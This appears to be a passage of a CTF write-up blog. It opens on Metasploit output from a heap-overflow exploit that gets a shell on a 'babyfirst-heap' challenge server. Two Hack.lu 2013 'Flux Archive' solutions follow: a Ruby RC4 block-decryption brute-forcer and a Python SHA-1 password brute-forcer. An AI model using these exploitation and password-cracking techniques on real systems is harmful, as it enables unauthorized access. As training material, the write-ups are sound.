<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</span><span class='line'>
</span><span class='line'><span class="o">[*]</span> <span class="no">Started</span> <span class="n">bind</span> <span class="n">handler</span>
</span><span class='line'>
</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">going</span> <span class="n">to</span> <span class="n">allocate</span> <span class="mi">20</span> <span class="n">objects</span><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="no">Using</span> <span class="no">Dougle</span> <span class="no">Lee</span> <span class="no">Allocator</span> <span class="mi">2</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="no">Goodluck</span><span class="o">!</span>
</span><span class='line'>
</span><span class='line'><span class="no">Exit</span> <span class="n">function</span> <span class="n">pointer</span> <span class="n">is</span> <span class="n">at</span> <span class="mi">804</span><span class="no">C8AC</span> <span class="n">address</span><span class="o">.</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB008</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1246</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB4F0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1121</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB958</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">947</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFBD10</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">741</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC000</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">706</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC2C8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">819</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC600</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">673</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC8A8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1004</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFCC98</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">952</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD058</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">755</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD350</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">260</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD458</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">877</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD7D0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1245</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFDCB8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1047</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE0D8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1152</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE560</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1047</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE980</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1059</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFEDA8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">906</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFF138</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">879</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFF4B0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">823</span><span class="o">]</span>
</span><span class='line'><span class="no">Write</span> <span class="n">to</span> <span class="n">object</span> <span class="o">[</span><span class="n">size</span><span class="o">=</span><span class="mi">260</span><span class="o">]</span><span class="p">:</span>
</span><span class='line'><span class="o">[*]</span> <span class="no">Copied</span> <span class="mi">273</span> <span class="n">bytes</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="o">[*]</span> <span class="no">Command</span> <span class="n">shell</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">12</span><span class="p">:</span><span class="mi">56273</span> <span class="o">-&gt;</span> <span class="mi">23</span><span class="o">.</span><span class="mi">22</span><span class="o">.</span><span class="mi">192</span><span class="o">.</span><span class="mi">226</span><span class="p">:</span><span class="mi">4444</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2014</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">39</span> <span class="o">-</span><span class="mo">0400</span>
</span><span class='line'>
</span><span class='line'><span class="n">cat</span> <span class="n">key</span>
</span><span class='line'><span class="n">cat</span><span class="p">:</span> <span class="n">key</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
</span><span class='line'><span class="n">cd</span> <span class="sr">/home</span>
</span><span class='line'><span class="sr">ls</span>
</span><span class='line'><span class="sr">babyfirst-heap</span>
</span><span class='line'><span class="sr">ubuntu</span>
</span><span class='line'><span class="sr">cd b</span>
</span><span class='line'><span class="sr">/</span><span class="n">bin</span><span class="o">//</span><span class="n">sh</span><span class="p">:</span> <span class="mi">5</span><span class="p">:</span> <span class="n">cd</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t cd to b</span>
</span><span class='line'><span class="s1">cd babyfirst-heap</span>
</span><span class='line'><span class="s1">cat key</span>
</span><span class='line'><span class="s1">cat: key: No such file or directory</span>
</span><span class='line'><span class="s1">ls</span>
</span><span class='line'><span class="s1">babyfirst-heap</span>
</span><span class='line'><span class="s1">flag</span>
</span><span class='line'><span class="s1">cat flag</span>
</span><span class='line'><span class="s1">The flag is: Good job on that doubly linked list. Why don&#39;</span><span class="n">t</span> <span class="n">you</span> <span class="n">try</span> <span class="n">something</span> <span class="n">harder!</span><span class="o">!</span><span class="no">OMG</span><span class="o">!!</span>
</span></code></pre></td></tr></table></div></figure>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2/">Hack.lu 2013 - Flux Archive Part 2</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-10-27T15:46:00-04:00" pubdate data-updated="true">Oct 27<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>These sneaky humans! They do not just use one passcode, but two to enter the Festzelt. We heard that the passcode is hidden inside the archive file. It seems that the FluxFingers overrated their programming skill and had a major logical flaw in the archive file structure. Some of the drunken Oktoberfest humans found it and abused this flaw in order to transfer hidden messages. Find this passcode so we can finally drink their beer!</p>

<h2>Analysis</h2>

<p>Somewhere in the archive there is some hidden data. Playing around with the tool, I notice that when we delete archives the file size does not change. It must just leave the file entry data but delete the file itself.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ./archiv -a myarchive.arc 123456 <span class="nb">test</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>FluxArchiv - solved security since 2007!
</span><span class='line'>Written by sqall - leading expert in social-kernel-web-reverse-engineering.
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>Archiv myarchive.arc successfully created.
</span><span class='line'>
</span><span class='line'>Progress:
</span><span class='line'>0% ... 10% ... 20% ... 30% ... 40% ... 50% ... 60% ... 70% ... 80% ... 90% ... 100%
</span><span class='line'>
</span><span class='line'>File <span class="nb">test </span>successfully added to the archiv.
</span><span class='line'>
</span><span class='line'>% ls -al myarchive.arc
</span><span class='line'>-rw-rw-r-- 1 stacks0n stacks0n 2112 Oct 23 20:39 myarchive.arc
</span><span class='line'>
</span><span class='line'>% ./archiv -d myarchive.arc 123456 <span class="nb">test</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>FluxArchiv - solved security since 2007!
</span><span class='line'>Written by sqall - leading expert in social-kernel-web-reverse-engineering.
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'>File <span class="nb">test </span>successfully deleted from the archiv.
</span><span class='line'>
</span><span class='line'>% ls -al myarchive.arc
</span><span class='line'>-rw-rw-r-- 1 stacks0n stacks0n 2112 Oct 23 20:39 myarchive.arc
</span></code></pre></td></tr></table></div></figure>

<p>Looking at sanitizeFilename(), file entries begin at offset 0x20 and there is a magic value of &quot;FluXL1sT&quot;. The filenames are RC4 encrypted with the key being the SHA-1 sum of the archive password. Setting a breakpoint in sanitizeFilename() towards the end of the function, we notice a number of files that are simply empty string. It would appear that they are simply cleared out when deleted.</p>

<p>I wonder if we can simply just encrypt a new filename and replace the entry to access the file without having to learn anything else about the file format. Turns out that I struggled with that, but when decrypting blocks in the file noticed my plaintext being displayed. So rather than actually figure out the format, lets just brute force decrypting blocks and see if we get lucky.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;rc4&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;digest/sha1&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;FluxArchiv.arc&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="kp">false</span>
</span><span class='line'>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;PWF41L&quot;</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">.</span><span class="n">size</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dec</span> <span class="o">=</span> <span class="no">RC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'>    <span class="n">cleartext</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">cleartext</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sr">/^[\w\s]{6}/</span><span class="p">)</span> <span class="ow">and</span> <span class="n">cleartext</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sr">/key|flag/i</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="n">cleartext</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ruby fluxarchiv2.rb
</span><span class='line'>e electron and the switch, the
</span><span class='line'>beauty of the baud.  We make use of a service already existing without paying
</span><span class='line'><span class="k">for </span>what could be dirt-cheap <span class="k">if </span>it wasn<span class="s1">&#39;t run by profiteering gluttons, and</span>
</span><span class='line'><span class="s1">you call us criminals.  We explore... and you call us criminals.  We seek</span>
</span><span class='line'><span class="s1">after knowledge... and you call us criminals.  We exist without skin color,</span>
</span><span class='line'><span class="s1">without nationality, without religious bias... and you call us criminals.</span>
</span><span class='line'><span class="s1">You build atomic bombs, you wage wars, you murder, cheat, and lie to us</span>
</span><span class='line'><span class="s1">and try to make us believe it&#39;</span>s <span class="k">for </span>our own good, yet we<span class="s1">&#39;re the criminals.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Yes, I am a criminal.  My crime is that of curiosity.  My crime is</span>
</span><span class='line'><span class="s1">that of judging people by what they say and think, not what they look like.</span>
</span><span class='line'><span class="s1">My crime is that of outsmarting you, something that you will never forgive me</span>
</span><span class='line'><span class="s1">for.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">I am a hacker, and this is my manifesto.  You may stop this individual,</span>
</span><span class='line'><span class="s1">but you can&#39;</span>t stop us all... after all, we<span class="err">&#39;</span>re all alike.
</span><span class='line'>
</span><span class='line'>+++The Mentor+++
</span><span class='line'>
</span><span class='line'>Flag: D3letinG-1nd3x_F4iL
</span></code></pre></td></tr></table></div></figure>

<p><code>D3letinG-1nd3x_F4iL</code></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-1/">Hack.lu 2013 - Flux Archive Part 1</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-10-27T15:42:00-04:00" pubdate data-updated="true">Oct 27<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-1/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>These funny humans try to exclude us from the delicious beer of the Oktoberfest! They made up a passcode for everyone who wants to enter the Festzelt. Sadly, our human informant friend could not learn the passcode for us. But he heard a conversation between two drunken humans, that they were using the same passcode for this intercepted archive file. They claimed that the format is is absolutely secure and solves any kind of security issue. It&#8217;s written by this funny hacker group named FluxFingers. Real jerks if you ask me. Anyway, it seems that the capability of drunken humans to remember things is limited. So they just used a 6 character passcode with only numbers and upper-case letters. So crack this passcode and get our ticket to their delicious german beer!</p>

<p>Here is the challenge: https://ctf.fluxfingers.net/static/downloads/fluxarchiv/hacklu2013<em>archiv</em>challenge1.tar.gz</p>

<h2>Analysis</h2>

<p>Provided with a 64-bit ELF and a data file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>stacks0n@ubuntu:~/Desktop$ ./archiv
</span><span class='line'>
</span><span class='line'>################################################################################
</span><span class='line'>
</span><span class='line'>FluxArchiv - solved security since 2007!
</span><span class='line'>Written by sqall - leading expert in social-kernel-web-reverse-engineering.
</span><span class='line'>
</span><span class='line'>################################################################################
</span><span class='line'>
</span><span class='line'>Unknown or invalid command.
</span><span class='line'>
</span><span class='line'>Usage: ./archiv &lt;command&gt; &lt;archiv&gt; &lt;password&gt; &lt;file&gt;
</span><span class='line'>commands:
</span><span class='line'>-l &lt;archiv&gt; &lt;password&gt; - lists all files in the archiv.
</span><span class='line'>-a &lt;archiv&gt; &lt;password&gt; &lt;file&gt; - adds a file to the archiv (when archiv does not exist create a new archiv).
</span><span class='line'>-x &lt;archiv&gt; &lt;password&gt; &lt;filename&gt; - extracts the given filename from the archiv.
</span><span class='line'>-d &lt;archiv&gt; &lt;password&gt; &lt;filename&gt; - delete the given filename from the archiv.</span></code></pre></td></tr></table></div></figure>

<p>Presumably, we could try to brute force the entire key space (36^6) but that might take a while when trying to execute the program. So let&#8217;s look into some of the key functions. Tracing backwards from the output of &quot;Given password is not correct&quot; we target verifyArchiv()</p>

<h3>verifyArchiv</h3>

<p>This method reads 0x14 (20) bytes from the archive file starting at offset 0xC (12) which is our target hash to verify that the password is accurate. It starts by grabbing bytes from hash_password (SHA-1 sum of password) out of order, but in a predictable manner. Look at the python code for that order. Then, the byte stream of the hash is run through SHA-1 and compared against the target. Thus, we can brute force the entire key space only running the code necessary to find the target.</p>

<h2>Code</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">hashlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">bruteforce</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">maxlength</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">chain</span><span class="o">.</span><span class="n">from_iterable</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">maxlength</span><span class="p">,</span> <span class="n">maxlength</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="n">bruteforce</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
</span><span class='line'>    <span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">attempt</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
</span><span class='line'>    <span class="n">hash_scramble</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span>
</span><span class='line'>    <span class="n">new_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">hash_scramble</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">new_hash</span> <span class="o">==</span> <span class="s">&quot;372942df2712824505d8171f4f0bcb14153d39ba&quot;</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Found passphrase: &quot;</span> <span class="o">+</span> <span class="n">attempt</span>
</span><span class='line'>        <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">stacks0n</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="n">python</span> <span class="n">fluxarchiv</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="n">Found</span> <span class="n">passphrase</span><span class="p">:</span> <span class="n">PWF41L</span>
</span><span class='line'>
